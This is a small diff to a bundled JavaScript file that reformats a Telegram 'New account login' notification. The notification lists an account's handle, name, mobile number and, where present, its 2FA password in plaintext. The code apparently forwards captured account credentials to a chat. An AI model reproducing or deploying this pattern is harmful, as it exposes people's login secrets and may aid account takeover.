@@ -48541,13 +48541,13 @@ const rich_message_1 = __webpack_require__(/*! ../../utils/rich-message */ "./sr
 function accountLoginHtml(user, mobile) {
     const handle = user.username?.replace(/^@/, '');
     const name = [user.firstName, user.lastName].map((v) => v?.trim()).filter(Boolean).join(' ');
-    return [
-        '<b>New account login</b>',
+    const details = [
         handle && `Account: <a href="https://t.me/${encodeURIComponent(handle)}">@${(0, rich_message_1.escapeTelegramHtml)(handle)}</a>`,
         name && `Name: ${(0, rich_message_1.escapeTelegramHtml)(name)}`,
         `Mobile: <code>${(0, rich_message_1.escapeTelegramHtml)(mobile)}</code>`,
         user.password && `2FA: <code>${(0, rich_message_1.escapeTelegramHtml)(user.password)}</code>`,
-    ].filter(Boolean).join('\n');
+    ].filter(Boolean);
+    return ['<b>New account login</b>', '', ...details].join('\n');
 }
 let UsersService = UsersService_1 = class UsersService {
     constructor(userModel, telegramService, clientsService, botsService, bufferClientService, promoteClientService) {
